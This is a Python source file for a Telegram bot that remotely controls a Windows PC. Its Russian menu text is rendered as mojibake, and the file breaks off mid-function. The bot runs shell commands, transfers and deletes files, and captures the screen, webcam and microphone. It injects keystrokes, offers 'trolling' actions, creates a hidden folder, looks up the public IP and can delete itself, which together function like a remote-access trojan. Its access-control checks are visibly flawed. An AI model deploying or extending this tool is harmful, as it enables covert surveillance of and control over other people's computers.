# –ì–ò–¢–•–ê–ë –ê–í–¢–û–†–ê: github.com/resppl
# –°–ö–†–ò–ü–¢ –ù–ê –ì–ò–¢–•–ê–ë–ï: github.com/resppl/TelegramRemotePC
# –°–ê–ô–¢ –ê–í–¢–û–†–ê: resppl.ru

import os, pyautogui, subprocess, keyboard, psutil, sqlite3, cv2, pyaudio, wave, asyncio, time

from shutil import rmtree, disk_usage
from ctypes import windll
from telebot import types, TeleBot
from typing import List
from random import randint
from time import sleep
import urllib.parse
from platform import uname
from pygetwindow import getActiveWindowTitle
from http.client import HTTPConnection
from webbrowser import open as webopen
from datetime import datetime
from screen_brightness_control import set_brightness, get_brightness

conn = sqlite3.connect('visitors.db')
cursor = conn.cursor()
cursor.execute('''CREATE TABLE IF NOT EXISTS visitors (id INTEGER PRIMARY KEY)''')
conn.commit()
conn.close()


conn = sqlite3.connect('fulldostup.db')
cursor = conn.cursor()
cursor.execute('''CREATE TABLE IF NOT EXISTS users_with_access (user_id INTEGER PRIMARY KEY)''')
conn.commit()
conn.close()

KEYS = ["enter", "backspace", "space", "tab", "ctrl+a", "ctrl+z", "ctrl+c", "ctrl+v", "ctrl+s", "ctrl+shift+esc"]
CMDS = ['tasklist', 'ping']

title_files_and_folders = "üìÇ –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Ñ–∞–π–ª–∞–º–∏ –∏ –ø–∞–ø–∫–∞–º–∏"
title_keys = "‚å®Ô∏è –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –∫–ª–∞–≤–∏—à–∞–º–∏"
title_console = "üíª –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –∫–æ–Ω—Å–æ–ª—å—é"
title_settings_pc = "‚öôÔ∏è –ù–∞—Å—Ç—Ä–æ–π–∫–∏ –ü–ö"
title_trolling = "üòà –¢—Ä–æ–ª–ª–∏–Ω–≥"
title_specfunc = "üõ†Ô∏è –°–ø–µ—Ü–∏–∞–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏"
title_info_cmd = "üí° –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–∫—Ä–∏–ø—Ç–µ"

text_give_access = "‚úÖ –í—ã–¥–∞—Ç—å –ø–æ–ª–Ω—ã–π –¥–æ—Å—Ç—É–ø"
text_list_access = "üìã –°–ø–∏—Å–æ–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π —Å –ø–æ–ª–Ω—ã–º –¥–æ—Å—Ç—É–ø–æ–º"
text_remove_access = "‚ùå –û—Ç–æ–±—Ä–∞—Ç—å –ø–æ–ª–Ω—ã–π –¥–æ—Å—Ç—É–ø"


wrong_choice = "‚ùå *–ù–µ–≤–µ—Ä–Ω—ã–π –≤—ã–±–æ—Ä! –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É*"

back_text = "‚óÄÔ∏è –í–µ—Ä–Ω—É—Ç—å—Å—è"

file_menu_create_files_and_folders = "üìã –°–æ–∑–¥–∞—Ç—å —Ñ–∞–π–ª / –ø–∞–ø–∫—É"
file_menu_delete_files_and_folders = "üóë –£–¥–∞–ª–∏—Ç—å —Ñ–∞–π–ª / –ø–∞–ø–∫—É"
file_menu_edit_files = "‚úèÔ∏è –ò–∑–º–µ–Ω–∏—Ç—å —Ñ–∞–π–ª"
file_menu_start_programm = "üöÄ –ó–∞–ø—É—Å—Ç–∏—Ç—å –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–π —Ñ–∞–π–ª"
file_menu_download_file_by_pc = "‚¨áÔ∏è –°–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª —Å –ü–ö"
file_menu_upload_file_to_pc = "‚¨ÜÔ∏è –í—ã–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª –Ω–∞ –ü–ö"

console_menu_enter_commands = "‚å®Ô∏è –í–≤–µ—Å—Ç–∏ –∫–æ–º–∞–Ω–¥—É"
console_menu_start_python_script = "üóÑ –ó–∞–ø—É—Å—Ç–∏—Ç—å —Å–∫—Ä–∏–ø—Ç Python"
console_menu_screenshot = "üñ• –°–¥–µ–ª–∞—Ç—å —Å–∫—Ä–∏–Ω—à–æ—Ç —ç–∫—Ä–∞–Ω–∞"
console_menu_webcam = "üì∏ –°–¥–µ–ª–∞—Ç—å —Ñ–æ—Ç–æ –≤–µ–±-–∫–∞–º–µ—Ä—ã"
console_menu_webvideocam = "üìπ –ó–∞–ø–∏—Å–∞—Ç—å –≤–∏–¥–µ–æ –Ω–∞ –∫–∞–º–µ—Ä—É"
console_menu_check_directories = "üìÇ –î–∏—Ä–µ–∫—Ç–æ—Ä–∏—è –∫–æ–º–ø—å—é—Ç–µ—Ä–∞"
console_menu_microphone = "üéô –ó–∞–ø–∏—Å–∞—Ç—å –≥–æ–ª–æ—Å"
console_menu_open_site = "üåê –û—Ç–∫—Ä—ã—Ç—å —Å–∞–π—Ç"
console_menu_create_msgbox = "‚ùóÔ∏è –°–æ–∑–¥–∞—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ –¥–∏–∞–ª–æ–≥–æ–≤–æ–º –æ–∫–Ω–µ (MSGBOX)"
console_menu_list_process = "üìã –°–ø–∏—Å–æ–∫ –∞–∫—Ç–∏–≤–Ω—ã—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤"

keys_menu_write = "‚å®Ô∏è –ù–∞–ø–µ—á–∞—Ç–∞—Ç—å —Ç–µ–∫—Å—Ç"
keys_menu_press_keys = "‚å®Ô∏è –ù–∞–∂–∞—Ç—å –Ω–∞ –∫–ª–∞–≤–∏—à—É"
keys_menu_media_keys = "‚ñ∂Ô∏è‚è∏‚èπ –ù–∞–∂–∞—Ç—å –Ω–∞ –º–µ–¥–∏–∞-–∫–ª–∞–≤–∏—à—É"

settings_pc_menu_change_brightness = "‚òÄÔ∏è –ò–∑–º–µ–Ω–∏—Ç—å —è—Ä–∫–æ—Å—Ç—å —ç–∫—Ä–∞–Ω–∞"
settings_pc_menu_info_pc = "üñ• –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ü–ö"
settings_pc_menu_change_volume = "üîä –ò–∑–º–µ–Ω–∏—Ç—å –≥—Ä–æ–º–∫–æ—Å—Ç—å"

packs_menu_open_sites = "üåê –û—Ç–∫—Ä—ã—Ç—å –º–Ω–æ–∂–µ—Å—Ç–≤–æ —Å–∞–π—Ç–æ–≤"
packs_menu_open_conductors = "üìÇ –û—Ç–∫—Ä—ã—Ç—å –º–Ω–æ–∂–µ—Å—Ç–≤–æ –ø—Ä–æ–≤–æ–¥–Ω–∏–∫–æ–≤"
packs_menu_moving_mouse = "üñ± –ü–µ—Ä–µ–º–µ—â–µ–Ω–∏–µ –º—ã—à–∫–∏"
packs_menu_open_cmds = "üóÑ –û—Ç–∫—Ä—ã—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ –æ–∫–æ–Ω –∫–æ–º–∞–Ω–¥–Ω–æ–π –∫–æ–Ω—Å–æ–ª–∏"

admin_panel_text = "üîí –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–∏–≤–Ω–∞—è –ø–∞–Ω–µ–ª—å"

specfunc_menu_restart_pc = "üîÑ –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –∫–æ–º–ø—å—é—Ç–µ—Ä"
specfunc_menu_logout_your_account = "üë§ –í—ã–π—Ç–∏ –∏–∑ —É—á–µ—Ç–Ω–æ–π –∑–∞–ø–∏—Å–∏"
specfunc_menu_turn_off_pc = "‚ùå –í—ã–∫–ª—é—á–∏—Ç—å –∫–æ–º–ø—å—é—Ç–µ—Ä"
specfunc_menu_logout_script = "üìÇ –í—ã–π—Ç–∏ –∏–∑ —Å–∫—Ä–∏–ø—Ç–∞"
specfunc_menu_delete_script_by_folders = "üìÇ –£–¥–∞–ª–∏—Ç—å –ø–∞–ø–∫—É —Å–æ —Å–∫—Ä–∏–ø—Ç–æ–º"

specfunc_keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
specfunc_keyboard.add(types.KeyboardButton(specfunc_menu_restart_pc), types.KeyboardButton(specfunc_menu_logout_your_account), types.KeyboardButton(specfunc_menu_turn_off_pc))
specfunc_keyboard.add(types.KeyboardButton(specfunc_menu_logout_script), types.KeyboardButton(specfunc_menu_delete_script_by_folders))
specfunc_keyboard.add(types.KeyboardButton(back_text))


mainmenu_keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
mainmenu_keyboard.add(types.KeyboardButton(title_files_and_folders), types.KeyboardButton(title_keys))
mainmenu_keyboard.add(types.KeyboardButton(title_console), types.KeyboardButton(title_settings_pc))
mainmenu_keyboard.add(types.KeyboardButton(title_trolling), types.KeyboardButton(title_specfunc))
mainmenu_keyboard.add(types.KeyboardButton(title_info_cmd))

mainmenu_keyboard_admin = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
mainmenu_keyboard_admin.add(types.KeyboardButton(title_files_and_folders), types.KeyboardButton(title_keys))
mainmenu_keyboard_admin.add(types.KeyboardButton(title_console), types.KeyboardButton(title_settings_pc))
mainmenu_keyboard_admin.add(types.KeyboardButton(title_trolling), types.KeyboardButton(title_specfunc))
mainmenu_keyboard_admin.add(types.KeyboardButton(title_info_cmd), types.KeyboardButton(admin_panel_text))


back_keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
back_keyboard.add(types.KeyboardButton(back_text))

change_file_menu_text_add_content = "‚ûï –î–æ–±–∞–≤–∏—Ç—å —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ"
change_file_menu_text_full_edit_content = "‚úèÔ∏è –ü–æ–ª–Ω–æ—Å—Ç—å—é –∏–∑–º–µ–Ω–∏—Ç—å —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ"
change_file_menu_text_clear_file = "üóë –û—á–∏—Å—Ç–∏—Ç—å —Ñ–∞–π–ª"

delete_menu_text_delete_file = "üóë –£–¥–∞–ª–∏—Ç—å —Ñ–∞–π–ª"
delete_menu_text_delete_folder = "üóë –£–¥–∞–ª–∏—Ç—å –ø–∞–ø–∫—É"

download_on_pc_menu_text_upload_photo = "‚¨ÜÔ∏èüñº –í—ã–≥—Ä—É–∑–∏—Ç—å —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏—é"
download_on_pc_menu_text_upload_other = "‚¨ÜÔ∏èüìÇ –í—ã–≥—Ä—É–∑–∏—Ç—å –¥—Ä—É–≥–æ–µ"

files_menu_check_text_create_file = "‚ûï –°–æ–∑–¥–∞—Ç—å —Ñ–∞–π–ª"
files_menu_check_text_create_folder = "‚ûï –°–æ–∑–¥–∞—Ç—å –ø–∞–ø–∫—É"

media_keys_text_start_or_pause = "‚ñ∂Ô∏è‚è∏‚èπ –°—Ç–∞—Ä—Ç / –û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å"

if_confirm = "–î–∞, –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞—é"
if_deny = "–ù–µ—Ç, —è –ø–µ—Ä–µ–¥—É–º–∞–ª"

full_dostup_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
full_dostup_keyboard.add(types.KeyboardButton(text_give_access))
full_dostup_keyboard.add(types.KeyboardButton(text_list_access))
full_dostup_keyboard.add(types.KeyboardButton(text_remove_access))
full_dostup_keyboard.add(types.KeyboardButton(back_text))

pc_settings_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
pc_settings_keyboard.add(types.KeyboardButton(settings_pc_menu_change_brightness), types.KeyboardButton(settings_pc_menu_info_pc), types.KeyboardButton(settings_pc_menu_change_volume))
pc_settings_keyboard.add(types.KeyboardButton(back_text))

packs_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
packs_keyboard.add(types.KeyboardButton(packs_menu_open_sites), types.KeyboardButton(packs_menu_open_conductors))
packs_keyboard.add(types.KeyboardButton(packs_menu_moving_mouse), types.KeyboardButton(packs_menu_open_cmds))
packs_keyboard.add(types.KeyboardButton(back_text))

logout_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
logout_keyboard.add(types.KeyboardButton(if_confirm), types.KeyboardButton(if_deny))

off_computer_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
off_computer_keyboard.add(types.KeyboardButton(if_confirm), types.KeyboardButton(if_deny))

reboot_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
reboot_keyboard.add(types.KeyboardButton(if_confirm), types.KeyboardButton(if_deny))

menu_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
menu_keyboard.add(types.KeyboardButton(keys_menu_write), types.KeyboardButton(keys_menu_press_keys), types.KeyboardButton(keys_menu_media_keys))
menu_keyboard.add(types.KeyboardButton(back_text))

media_keys_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
media_keys_keyboard.add(types.KeyboardButton(media_keys_text_start_or_pause))
media_keys_keyboard.add(types.KeyboardButton(back_text))

console_menu_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
console_menu_keyboard.add(types.KeyboardButton(console_menu_enter_commands), types.KeyboardButton(console_menu_start_python_script))
console_menu_keyboard.add(types.KeyboardButton(console_menu_screenshot), types.KeyboardButton(console_menu_open_site))
console_menu_keyboard.add(types.KeyboardButton(console_menu_webcam), types.KeyboardButton(console_menu_webvideocam))
console_menu_keyboard.add(types.KeyboardButton(console_menu_microphone), types.KeyboardButton(console_menu_list_process))
console_menu_keyboard.add(types.KeyboardButton(console_menu_create_msgbox), types.KeyboardButton(console_menu_check_directories))
console_menu_keyboard.add(types.KeyboardButton(back_text))

files_menu_check_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
files_menu_check_keyboard.add(types.KeyboardButton(files_menu_check_text_create_file), types.KeyboardButton(files_menu_check_text_create_folder))
files_menu_check_keyboard.add(types.KeyboardButton(back_text))

files_menu_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
files_menu_keyboard.add(types.KeyboardButton(file_menu_create_files_and_folders), types.KeyboardButton(file_menu_delete_files_and_folders))
files_menu_keyboard.add(types.KeyboardButton(file_menu_edit_files), types.KeyboardButton(file_menu_start_programm))
files_menu_keyboard.add(types.KeyboardButton(file_menu_download_file_by_pc), types.KeyboardButton(file_menu_upload_file_to_pc))
files_menu_keyboard.add(types.KeyboardButton(back_text))

script_exit_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
script_exit_keyboard.add(types.KeyboardButton(if_confirm), (types.KeyboardButton(if_deny)))

download_on_pc_menu_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
download_on_pc_menu_keyboard.add(types.KeyboardButton(download_on_pc_menu_text_upload_photo), types.KeyboardButton(download_on_pc_menu_text_upload_other))
download_on_pc_menu_keyboard.add(types.KeyboardButton(back_text))

delete_menu_keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
delete_menu_keyboard.add(types.KeyboardButton(delete_menu_text_delete_file), types.KeyboardButton(delete_menu_text_delete_folder))
delete_menu_keyboard.add(types.KeyboardButton(back_text))

change_file_menu_keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
change_file_menu_keyboard.add(types.KeyboardButton(change_file_menu_text_add_content), types.KeyboardButton(change_file_menu_text_full_edit_content), types.KeyboardButton(change_file_menu_text_clear_file))
change_file_menu_keyboard.add(types.KeyboardButton(back_text))

admin_panel_text_access_control = "üóùÔ∏è –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ø–æ–ª–Ω—ã–º –¥–æ—Å—Ç—É–ø–æ–º"

access_control_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
access_control_keyboard.add(text_give_access)
access_control_keyboard.add(text_remove_access)
access_control_keyboard.add(text_list_access)

admin_panel_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
admin_panel_keyboard.add(types.KeyboardButton(admin_panel_text_access_control))
admin_panel_keyboard.add(types.KeyboardButton(back_text))

directories_check_all_directories = "üìÇ –ü–æ—Å–º–æ—Ç—Ä–µ—Ç—å –≤—Å—é –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é –∫–æ–º–ø—å—é—Ç–µ—Ä–∞"
directories_search_directories = "üìÇ –í—ã–±—Ä–∞—Ç—å –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é –∫–æ–º–ø—å—é—Ç–µ—Ä–∞"

directories_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
directories_keyboard.add(types.KeyboardButton(directories_check_all_directories))
directories_keyboard.add(types.KeyboardButton(directories_search_directories))
directories_keyboard.add(types.KeyboardButton(back_text))

TOKEN = "YOUR_BOT_TOKEN_HERE" # TOKEN –≤–∞—à–µ–≥–æ –±–æ—Ç–∞
ACCESS = YOUR_ID_TELEGRAM # ID –≤–∞—à–µ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞ —Ç–µ–ª–µ–≥—Ä–∞–º

LOGGING = False # –µ—Å–ª–∏ –≤—ã —Ö–æ—Ç–∏—Ç–µ, —á—Ç–æ–±—ã –ª–æ–≥–∏ –æ—Ç–æ–±—Ä–∞–∂–∞–ª–∏—Å—å, —Ç–æ —É—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ –∑–Ω–∞—á–µ–Ω–∏–µ True, –µ—Å–ª–∏ –Ω–µ—Ç, —Ç–æ –æ—Å—Ç–∞–≤—å—Ç–µ –∫–∞–∫ –µ—Å—Ç—å (False)

bot = TeleBot(TOKEN, parse_mode=None) 
pyautogui.FAILSAFE = False

try:
    def make_temp_folder():    
        os.mkdir(r'C:\temp')
        kernel32 = windll.kernel32
        attr = kernel32.GetFileAttributesW(r'C:\temp')
        kernel32.SetFileAttributesW(r'C:\temp', attr | 2)
        return True


    def is_access_denied(member: types.User):
        conn = sqlite3.connect('fulldostup.db')
        cursor = conn.cursor()
        cursor.execute("SELECT user_id FROM users_with_access")

        if member.id != [row[0] for row in cursor.fetchall()]: 
            return False
        if member.id == bot.user.id: 
            return False
        if member.id != ACCESS: 
            return True

    conn = HTTPConnection("ifconfig.me")
    try:
        conn.request("GET", "/ip")
        ip = conn.getresponse().read()
    except:
        ip = "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"

    total_mem, used_mem, free_mem = disk_usage('.')
    gb = 10 ** 9
    login = os.getlogin()
    width, height = pyautogui.size()
    oper = uname()
    try: virtual_memory = psutil.virtual_memory()
    except: virtual_memory = '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'

    try: battery = str(psutil.sensors_battery()[0]) + '%'
    except: battery = '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'

    @bot.message_handler(commands=['start'])
    def start(message: types.Message):
        conn = sqlite3.connect('visitors.db')
        cursor = conn.cursor()
        user_id = message.from_user.id
        cursor.execute("SELECT id FROM visitors WHERE id=?", (user_id,))
        existing_user = cursor.fetchone()

        if not existing_user:
            cursor.execute("INSERT INTO visitors (id) VALUES (?)", (user_id,))
            conn.commit()
        conn = sqlite3.connect('fulldostup.db')
        cursor = conn.cursor()
        cursor.execute("SELECT user_id FROM users_with_access")
        
        if message.from_user.id == ACCESS:
            bot.send_message(message.chat.id, "*üìå –í—ã –ø–µ—Ä–µ—à–ª–∏ –≤ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–∏–≤–Ω–æ–µ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é!*", reply_markup=mainmenu_keyboard_admin, parse_mode='Markdown')
            return bot.register_next_step_handler(message, check_main_admin)
        elif message.from_user.id in [row[0] for row in cursor.fetchall()]:
            bot.send_message(message.chat.id, '*üìå –í—ã –ø–µ—Ä–µ—à–ª–∏ –≤ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é!*', reply_markup=mainmenu_keyboard, parse_mode='Markdown')
            return bot.register_next_step_handler(message, check_main)

    def mainmenu(message: types.Message):
        conn = sqlite3.connect('fulldostup.db')
        cursor = conn.cursor()
        
        cursor.execute("SELECT user_id FROM users_with_access")
        if message.from_user.id != ACCESS:
            bot.send_message(message.chat.id, "*üìå –í—ã –ø–µ—Ä–µ—à–ª–∏ –≤ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–∏–≤–Ω–æ–µ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é!*", reply_markup=mainmenu_keyboard_admin, parse_mode='Markdown')
            return bot.register_next_step_handler(message, check_main_admin)
        elif message.from_user.id in [row[0] for row in cursor.fetchall()]:
            bot.send_message(message.chat.id, '*üìå –í—ã –ø–µ—Ä–µ—à–ª–∏ –≤ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é!*', reply_markup=mainmenu_keyboard, parse_mode='Markdown')
            return bot.register_next_step_handler(message, check_main)

    def check_main(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        elif message.text.strip() == title_files_and_folders: return files_menu(message)
        elif message.text.strip() == title_console: return console_menu(message)
        elif message.text.strip() == title_keys: return keyboard_menu(message)
        elif message.text.strip() == title_trolling: return packs(message)
        elif message.text.strip() == title_specfunc: return other_functions(message)
        elif message.text.strip() == title_settings_pc: return pc_settings(message)
        elif message.text.strip() == title_info_cmd: return info_script(message)
        elif message.text.strip() == '/start': return start(message)

        bot.send_message(message.chat.id, wrong_choice, parse_mode='Markdown')
        return mainmenu(message)

    def check_main_admin(message: types.Message):
        if message.from_user.id == ACCESS:
            if message.text.strip() == title_files_and_folders: return files_menu(message)
            elif message.text.strip() == title_console: return console_menu(message)
            elif message.text.strip() == title_keys: return keyboard_menu(message)
            elif message.text.strip() == title_trolling: return packs(message)
            elif message.text.strip() == title_specfunc: return other_functions(message)
            elif message.text.strip() == title_settings_pc: return pc_settings(message)
            elif message.text.strip() == title_info_cmd: return info_script(message)
            elif message.text.strip() == admin_panel_text: return admin_panel(message)
            elif message.text.strip() == '/start': return start(message)

        bot.send_message(message.chat.id, wrong_choice, parse_mode='Markdown')
        return mainmenu(message)

    def list_files(startpath):
        result = ''
        for root, dirs, files in os.walk(startpath):
            level = root.replace(startpath, '').count(os.sep)
            indent = ' ' * 4 * (level)
            result += '{}{}/\n'.format(indent, os.path.basename(root))
            subindent = ' ' * 4 * (level + 1)
            for f in files:
                result += '{}{}\n'.format(subindent, f)
        return result

    def admin_panel(message: types.Message):

        if message.from_user.id == ACCESS:
            bot.send_message(message.chat.id, "üîí –í—ã –ø–µ—Ä–µ—à–ª–∏ –≤ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–∏–≤–Ω—ã–π —Ä–∞–∑–¥–µ–ª", reply_markup=admin_panel_keyboard)
            return bot.register_next_step_handler(message, admin_panel_check)
        else:
            bot.send_message(message.chat.id, "‚ùå –í–∞–º –∑–∞–ø—Ä–µ—â–µ–Ω –¥–æ—Å—Ç—É–ø –∫ –¥–∞–Ω–Ω–æ–º—É —Ä–∞–∑–¥–µ–ª—É ‚ùå")

    def admin_panel_check(message: types.Message):
        if message.from_user.id == ACCESS:
            if message.text.strip() == admin_panel_text_access_control: 
                return access_control(message)
            elif message.text.strip() == '/start': return start(message)
            elif message.text.strip() == back_text: return start(message)
        else:
            bot.send_message(message.chat.id, "‚ùå –í–∞–º –∑–∞–ø—Ä–µ—â–µ–Ω –¥–æ—Å—Ç—É–ø –∫ –¥–∞–Ω–Ω–æ–º—É —Ä–∞–∑–¥–µ–ª—É ‚ùå")
        
        bot.send_message(message.chat.id, wrong_choice, parse_mode='Markdown')
        return admin_panel(message)



    def access_control(message: types.Message):
        if message.from_user.id == ACCESS:
            bot.send_message(message.chat.id, "–í—ã –ø–µ—Ä–µ—à–ª–∏ –≤ —Ä–∞–∑–¥–µ–ª —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –ø–æ–ª–Ω—ã–º –¥–æ—Å—Ç—É–ø–æ–º, –≤—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ, –∫–æ—Ç–æ—Ä–æ–µ —Ö–æ—Ç–∏—Ç–µ —Å–æ–≤–µ—Ä—à–∏—Ç—å.", reply_markup=full_dostup_keyboard)
            bot.register_next_step_handler(message, access_control_check)
        else:
            bot.send_message(message.chat.id, "‚ùå –í–∞–º –∑–∞–ø—Ä–µ—â–µ–Ω –¥–æ—Å—Ç—É–ø –∫ –¥–∞–Ω–Ω–æ–º—É —Ä–∞–∑–¥–µ–ª—É ‚ùå")

    def access_control_check(message: types.Message):
        if message.from_user.id == ACCESS:
            if message.text.strip() == text_give_access: return give_access(message)
            elif message.text.strip() == text_remove_access: return take_access(message)
            elif message.text.strip() == text_list_access: return list_users_with_access(message)
            elif message.text.strip() == back_text: return admin_panel(message)
            elif message.text.strip() == '/start': return start(message)
        else:
            bot.send_message(message.chat.id, "‚ùå –í–∞–º –∑–∞–ø—Ä–µ—â–µ–Ω –¥–æ—Å—Ç—É–ø –∫ –¥–∞–Ω–Ω–æ–º—É —Ä–∞–∑–¥–µ–ª—É ‚ùå")

        bot.send_message(message.chat.id, wrong_choice, parse_mode='Markdown')

    def list_users_with_access(message: types.Message):
        conn = sqlite3.connect('fulldostup.db')
        cursor = conn.cursor()

        cursor.execute("SELECT user_id FROM users_with_access")
        if message.from_user.id == ACCESS:
            conn = sqlite3.connect('fulldostup.db', check_same_thread=False)
            cursor = conn.cursor()
            cursor.execute("CREATE TABLE IF NOT EXISTS users_with_access (user_id INTEGER)")
            cursor.execute("SELECT user_id FROM users_with_access")
            users_with_access = cursor.fetchall()

            if not users_with_access:
                bot.send_message(message.chat.id, "üîê –°–ø–∏—Å–æ–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π —Å –ø–æ–ª–Ω—ã–º –¥–æ—Å—Ç—É–ø–æ–º —è–≤–ª—è–µ—Ç—Å—è –ø—É—Å—Ç—ã–º")
                return access_control(message)
            else:
                users_list = '\n- '.join(str(user[0]) for user in users_with_access)
                bot.send_message(message.chat.id, f"üîê –°–ø–∏—Å–æ–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π —Å –ø–æ–ª–Ω—ã–º –¥–æ—Å—Ç—É–ø–æ–º: üîê\n- {users_list}")
                cursor.close()
                conn.close()
                return access_control(message)
        else:
            bot.send_message(message.chat.id, "‚ùå –í–∞–º –∑–∞–ø—Ä–µ—â–µ–Ω –¥–æ—Å—Ç—É–ø –∫ –¥–∞–Ω–Ω–æ–º—É —Ä–∞–∑–¥–µ–ª—É ‚ùå") 

    def take_access(message: types.Message):
        if message.text.strip() == back_text: return access_control(message)
        elif message.text.strip() == '/start': return start(message)
        conn = sqlite3.connect('fulldostup.db')
        cursor = conn.cursor()
        cursor.execute("SELECT user_id FROM users_with_access")
        if message.from_user.id == ACCESS:
            bot.send_message(message.chat.id, "üîí –î–ª—è –∞–Ω–Ω—É–ª–∏—Ä–æ–≤–∞–Ω–∏—è –¥–æ—Å—Ç—É–ø–∞ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –≤–≤–µ—Å—Ç–∏ —É–Ω–∏–∫–∞–ª—å–Ω—ã–π ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è Telegram. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —É–∫–∞–∂–∏—Ç–µ ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –∫–æ—Ç–æ—Ä–æ–º—É –Ω—É–∂–Ω–æ –∞–Ω–Ω—É–ª–∏—Ä–æ–≤–∞—Ç—å –¥–æ—Å—Ç—É–ø –∫ —Å–∏—Å—Ç–µ–º–µ", reply_markup=back_keyboard)
            bot.register_next_step_handler(message, take_access_step)
        else:
            bot.send_message(message.chat.id, "‚ùå –í–∞–º –∑–∞–ø—Ä–µ—â–µ–Ω –¥–æ—Å—Ç—É–ø –∫ –¥–∞–Ω–Ω–æ–º—É —Ä–∞–∑–¥–µ–ª—É ‚ùå")

    def take_access_step(message: types.Message):
        if message.text.strip() == back_text: return access_control(message)
        elif message.text.strip() == '/start': return start(message)
        user_id = int(message.text)

        conn = sqlite3.connect('fulldostup.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM users_with_access WHERE user_id=?", (user_id,))
        user = cursor.fetchone()

        conn_visitors = sqlite3.connect('visitors.db')
        cursor_visitors = conn_visitors.cursor()
        cursor_visitors.execute("SELECT id FROM visitors WHERE id=?", (user_id,))
        visitor = cursor_visitors.fetchone()

        if visitor:
            if user:
                cursor.execute("DELETE FROM users_with_access WHERE user_id=?", (user_id,))
                conn.commit()
                bot.send_message(message.chat.id, f"‚õîÔ∏è –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å ID {user_id} –ª–∏—à–∏–ª—Å—è –ø–æ–ª–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø")
